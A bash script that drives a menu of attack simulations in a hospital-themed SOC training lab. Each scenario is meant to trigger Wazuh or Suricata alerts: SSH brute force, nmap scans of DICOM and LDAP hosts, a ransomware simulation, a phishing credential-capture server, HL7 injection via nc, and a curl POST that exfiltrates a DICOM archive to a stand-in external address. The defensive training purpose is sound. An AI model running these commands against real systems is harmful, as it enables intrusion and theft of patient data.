#!/usr/bin/env bash
# ================================================================
# DIC SOC Lab — Attack Simulation Demo Menu
# Runs attacks INSIDE the attacker container
# ================================================================
set -euo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

ATTACKER="dic-attacker"

header() {
  echo -e "\n${CYAN}${BOLD}══════════════════════════════════════════════════════${NC}"
  echo -e "${CYAN}${BOLD}  $*${NC}"
  echo -e "${CYAN}${BOLD}══════════════════════════════════════════════════════${NC}\n"
}
log()  { echo -e "${GREEN}[+]${NC} $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; }

start_attacker() {
  if ! docker ps --format '{{.Names}}' | grep -q "^${ATTACKER}$"; then
    log "Starting attacker container..."
    docker compose --profile attack up -d attacker
    sleep 2
  fi
}

run_attack() {
  start_attacker
  docker exec -it "$ATTACKER" bash -c "$1"
}

show_menu() {
  clear
  echo -e "${BOLD}${CYAN}"
  echo "  ╔══════════════════════════════════════════════════════════╗"
  echo "  ║         DIC SOC Lab — Attack Simulation Console         ║"
  echo "  ║           Watch Wazuh Dashboard: https://localhost       ║"
  echo "  ╚══════════════════════════════════════════════════════════╝"
  echo -e "${NC}"
  echo -e "  ${BOLD}MITRE ATT&CK Scenarios:${NC}"
  echo ""
  echo -e "  ${YELLOW}1${NC}) SSH Brute Force          → T1110   (PACS Server)"
  echo -e "  ${YELLOW}2${NC}) DICOM Port Scan           → T1046   (Reconnaissance)"
  echo -e "  ${YELLOW}3${NC}) Ransomware Simulation     → T1486   (DICOM Encryption)"
  echo -e "  ${YELLOW}4${NC}) Phishing Page             → T1566   (Credential Harvest)"
  echo -e "  ${YELLOW}5${NC}) DICOM Exfiltration        → T1041   (Data Exfiltration)"
  echo -e "  ${YELLOW}6${NC}) HL7 Protocol Abuse        → T1071   (Application Layer)"
  echo -e "  ${YELLOW}7${NC}) AD Enumeration (LDAP)     → T1087   (Discovery)"
  echo -e "  ${YELLOW}8${NC}) Full Attack Chain         → All of the above (sequential)"
  echo -e "  ${YELLOW}9${NC}) Restore DICOM files       → (after ransomware sim)"
  echo ""
  echo -e "  ${YELLOW}0${NC}) Exit"
  echo ""
  echo -n "  Select scenario [0-9]: "
}

# ================================================================
# Attack Scenarios
# ================================================================

attack_ssh_brute() {
  header "T1110 — SSH Brute Force against PACS (10.10.10.10)"
  warn "MITRE ATT&CK: Credential Access / Brute Force"
  warn "Wazuh Rule:   100005 (SSH brute force — Medical VLAN)"
  echo ""
  log "Launching hydra SSH brute force (10 attempts, no valid creds)..."
  run_attack "
    echo '[*] Starting SSH brute force against PACS server...'
    for i in \$(seq 1 15); do
      ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 \
          -o PasswordAuthentication=yes \
          wronguser@10.10.10.10 2>&1 | head -1 || true
      echo \"  Attempt \$i/15 — authentication failed\"
      sleep 0.5
    done
    echo '[+] 15 failed attempts sent — check Wazuh dashboard for Rule 100005 alert'
  "
}

attack_dicom_scan() {
  header "T1046 — Network Scan against PACS DICOM Port"
  warn "MITRE ATT&CK: Discovery / Network Service Discovery"
  warn "Suricata SID: 9000002 (NMAP DICOM port scan)"
  echo ""
  log "Launching nmap DICOM service scan..."
  run_attack "
    echo '[*] Scanning Medical VLAN — DICOM port 4242...'
    nmap -sS -sV -p 4242,8042,2575,22,80 10.10.10.10 -T4 --open 2>/dev/null || \
    nmap -sT -sV -p 4242,8042,2575,22,80 10.10.10.10 -T4 2>/dev/null
    echo ''
    echo '[*] Scanning full Medical VLAN for DICOM devices...'
    nmap -sT -p 4242 10.10.10.0/24 --open 2>/dev/null | grep -E 'open|Nmap|report' || true
    echo '[+] Scan complete — check Wazuh/Suricata alerts'
  "
}

attack_ransomware() {
  header "T1486 — Ransomware Simulation (DICOM File Encryption)"
  warn "MITRE ATT&CK: Impact / Data Encrypted for Impact"
  warn "Wazuh Rule:   100001 (Mass DICOM file modification — CRITICAL)"
  echo ""
  log "Generating 20 synthetic DICOM files then encrypting them..."
  run_attack "python3 /opt/attacks/generate_dicom.py"
  sleep 1
  run_attack "python3 /opt/attacks/ransomware_sim.py"
  echo ""
  log "Watch Wazuh dashboard — Rule 100001 CRITICAL alert should fire"
  log "SOAR playbook will auto-trigger if Shuffle is connected"
}

attack_phishing() {
  header "T1566.002 — Phishing Credential Harvest Page"
  warn "MITRE ATT&CK: Initial Access / Spearphishing Link"
  warn "Wazuh Rule:   100012, 100013 (credential harvest)"
  echo ""
  log "Starting credential capture server on attacker (port 8888)..."
  run_attack "
    pkill -f phish_server.py 2>/dev/null || true
    python3 /opt/attacks/phish_server.py &
    PHISH_PID=\$!
    echo '[+] Phishing server started. Simulating victim clicking link...'
    sleep 2

    # Simulate victim submitting credentials
    curl -s -X POST http://10.10.10.99:8888/login \
      -d 'username=radiologist1&password=Hospital2024!' \
      -H 'Content-Type: application/x-www-form-urlencoded' \
      -L -o /dev/null && echo '[+] Credentials captured!'
    curl -s -X POST http://10.10.10.99:8888/portal \
      -d 'username=admin&password=P@ssw0rd' \
      -H 'Content-Type: application/x-www-form-urlencoded' \
      -L -o /dev/null && echo '[+] Second credential set captured!'
    
    sleep 2
    kill \$PHISH_PID 2>/dev/null || true
    echo '[+] Check /var/log/phish_captures.log inside attacker container'
    cat /var/log/phish_captures.log 2>/dev/null || echo '(log file inside container)'
  " || true
}

attack_exfiltration() {
  header "T1041 — DICOM Data Exfiltration Simulation"
  warn "MITRE ATT&CK: Exfiltration / Exfiltration Over C2 Channel"
  warn "Wazuh Rule:   100011 (Large outbound transfer from Medical VLAN)"
  echo ""
  log "Archiving DICOM files and simulating exfiltration..."
  run_attack "
    echo '[*] Discovering DICOM files on PACS...'
    ls -la /opt/dicom_test/*.dcm 2>/dev/null | head -5 || echo '  (run ransomware sim first to generate files)'

    echo '[*] Archiving DICOM files for exfiltration...'
    cd /opt && tar czf /tmp/dicom_exfil.tar.gz dicom_test/ 2>/dev/null || tar czf /tmp/dicom_exfil.tar.gz /opt/dicom_test/ 2>/dev/null || true
    ls -lh /tmp/dicom_exfil.tar.gz 2>/dev/null && echo '[+] Archive created'

    echo '[*] Simulating HTTP POST exfiltration (to external host, will fail — this is a lab)...'
    curl -s -X POST -F 'file=@/tmp/dicom_exfil.tar.gz' \
      http://203.0.113.10:9999/upload --max-time 5 2>&1 || \
      echo '[*] Connection refused (expected — 203.0.113.10 is RFC5737 test address)'
    
    echo '[+] Exfiltration attempt logged — check Wazuh for Rule 100011'
    echo '[+] Suricata SID 9000003 should also fire (large outbound from Medical VLAN)'
  "
}

attack_hl7_abuse() {
  header "T1071 — HL7 Protocol Abuse (Unauthorized RIS Message)"
  warn "MITRE ATT&CK: C&C / Application Layer Protocol"
  warn "Suricata SID: 9000020 (HL7 from non-RIS source)"
  echo ""
  log "Sending unauthorized HL7 ADT message from attacker..."
  run_attack "
    echo '[*] Crafting fake HL7 ADT-A01 admission message...'
    HL7_MSG='MSH|^~\&|ATTACKER|LAB|RIS|DIC|20240115120000||ADT^A01|MSG001|P|2.3\rPID|||FAKE001||HACKED^PATIENT||19800101|M|||MALICIOUS STREET'
    echo -e \"\${HL7_MSG}\" | nc -w 3 10.10.10.20 2575 && \
      echo '[+] HL7 message sent to RIS (port 2575)' || \
      echo '[*] Connection attempt made — Suricata SID 9000020 should fire'
    
    echo '[*] Attempting DICOM C-STORE from unauthorized source...'
    echo 'FAKE_DICOM_PROBE' | nc -w 2 10.10.10.10 4242 2>/dev/null && \
      echo '[+] DICOM probe sent' || \
      echo '[*] DICOM connection attempt — Suricata SID 9000001 should fire'
  "
}

attack_ad_enum() {
  header "T1087.002 — Active Directory Enumeration via LDAP"
  warn "MITRE ATT&CK: Discovery / Domain Account"
  warn "Wazuh Rule:   100014 (Excessive LDAP queries)"
  echo ""
  log "Simulating LDAP enumeration against Admin VLAN (10.10.20.0/24)..."
  run_attack "
    echo '[*] Scanning Admin VLAN for LDAP services...'
    nmap -sT -p 389,636,445,3389 10.10.20.0/24 --open 2>/dev/null | grep -E 'open|report' || true

    echo '[*] Attempting LDAP queries (anonymous bind simulation)...'
    for i in \$(seq 1 35); do
      (ldapsearch -x -H ldap://10.10.20.10 -b 'DC=dic,DC=local' 2>/dev/null | head -2) || \
      (echo \"LDAP attempt \$i to 10.10.20.10\" && sleep 0.1)
    done
    echo '[+] 35 LDAP queries sent — Wazuh Rule 100014 threshold is 30/120s'
  "
}

attack_full_chain() {
  header "FULL ATTACK CHAIN — APT Simulation"
  echo -e "  ${BOLD}Simulating a realistic intrusion sequence:${NC}"
  echo -e "  1. Reconnaissance (T1046)"
  echo -e "  2. Credential Access via Phishing (T1566)"
  echo -e "  3. Lateral Movement / AD Enum (T1087)"
  echo -e "  4. Ransomware Deployment (T1486)"
  echo -e "  5. Data Exfiltration (T1041)"
  echo ""
  warn "Running all 5 stages with 5-second pause between each..."
  echo ""
  
  read -rp "  Press ENTER to start the full attack chain (or Ctrl+C to cancel)..."
  
  log "Stage 1/5: Reconnaissance..."
  attack_dicom_scan
  sleep 5
  
  log "Stage 2/5: Phishing..."
  attack_phishing
  sleep 5
  
  log "Stage 3/5: AD Enumeration..."
  attack_ad_enum
  sleep 5
  
  log "Stage 4/5: Ransomware..."
  attack_ransomware
  sleep 5
  
  log "Stage 5/5: Exfiltration..."
  attack_exfiltration
  
  header "Full attack chain complete!"
  echo -e "  ${GREEN}Check Wazuh dashboard for all triggered alerts.${NC}"
  echo -e "  ${GREEN}MITRE ATT&CK matrix should show: Initial Access → Discovery → Credential Access → Impact → Exfiltration${NC}"
}

restore_dicom() {
  header "Restoring DICOM files after ransomware simulation..."
  run_attack "
    if [[ -f /tmp/decrypt.key ]]; then
      python3 /opt/attacks/ransomware_sim.py --decrypt
      echo '[+] DICOM files restored'
    else
      echo '[!] No decrypt key found — run ransomware simulation first'
    fi
  "
}

# ================================================================
# Main loop
# ================================================================
while true; do
  show_menu
  read -r choice
  case "$choice" in
    1) attack_ssh_brute ;;
    2) attack_dicom_scan ;;
    3) attack_ransomware ;;
    4) attack_phishing ;;
    5) attack_exfiltration ;;
    6) attack_hl7_abuse ;;
    7) attack_ad_enum ;;
    8) attack_full_chain ;;
    9) restore_dicom ;;
    0) echo -e "\n${GREEN}Exiting demo. Lab is still running.${NC}\n"; exit 0 ;;
    *) warn "Invalid choice" ;;
  esac
  echo ""
  read -rp "  Press ENTER to return to menu..."
done
